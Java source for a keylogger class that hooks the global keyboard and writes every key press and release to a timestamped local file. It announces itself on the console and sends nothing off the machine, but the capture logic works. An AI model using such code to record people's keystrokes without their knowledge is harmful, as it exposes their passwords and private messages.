package app;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Map;

//Keyboard Hook Libraries
import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;

public class Keyboard implements Runnable{

    Thread keyboardThread;
	private String name;
	private FileWriter fileWriter;

	Sync sync;

	public Keyboard(String name, Sync sync) {
		this.name = name;
		this.sync = sync;
    }

    // private static boolean run = true;

	@Override
	public void run() {
        // Might throw a UnsatisfiedLinkError if the native library fails to load or a RuntimeException if hooking fails 
		GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true); // Use false here to switch to hook instead of raw input

		System.out.println("Key Logging Started, press [escape] key to shutdown. Connected keyboards:");		
		for (Map.Entry<Long, String> keyboard : GlobalKeyboardHook.listKeyboards().entrySet()) {
			System.out.format("Key Code : %d: Mode : %s\n", keyboard.getKey(), keyboard.getValue());
		}
		keyboardHook.addKeyListener(new GlobalKeyAdapter() {
		
			@Override 
			public void keyPressed(GlobalKeyEvent event) {
				try{
					fileWriter.write(event.toString());
					// System.out.println(event);
					if (event.getVirtualKeyCode() == GlobalKeyEvent.VK_ESCAPE) {
						sync.notify_all(false);
						// run = false;
					}
				}
				catch(IOException ex){
					System.out.println("Could not write pressed key using file writer");
				}
			}
			
			@Override 
			public void keyReleased(GlobalKeyEvent event) {
				try{
					fileWriter.write(event.toString());
					// System.out.println(event);
				}
				catch(IOException ex){
					System.out.println("Could not write release key using file writer");
				}
			}
		});
		
		try {
			while(sync.flag) { 
				Thread.sleep(128); 
			}
		} catch(InterruptedException e) { 
			System.out.println("Interrupted");
			//Do nothing
		} finally {
			keyboardHook.shutdownHook(); 
		}
		try{
			fileWriter.close();
		}
		catch(IOException ex){
			System.out.println("Could not successfully close file writer");
		}
	}

    public void start(){
        System.out.println("Thread started");
        if (keyboardThread== null) {
            keyboardThread = new Thread(this, name);
			keyboardThread.start();

			File file = new File("Java/KeyLogger/Logged_Keyboards/");
            boolean check = file.mkdirs();
            if(check){				
				try{
					fileWriter = new FileWriter(new File("Java/KeyLogger/Logged_Keyboards/" + new SimpleDateFormat("yyyy.MM.dd HH.mm.ss").format(new java.util.Date()) + ".txt"), true);
				}	
				catch(IOException ex){
				}
			}
        }
    }
}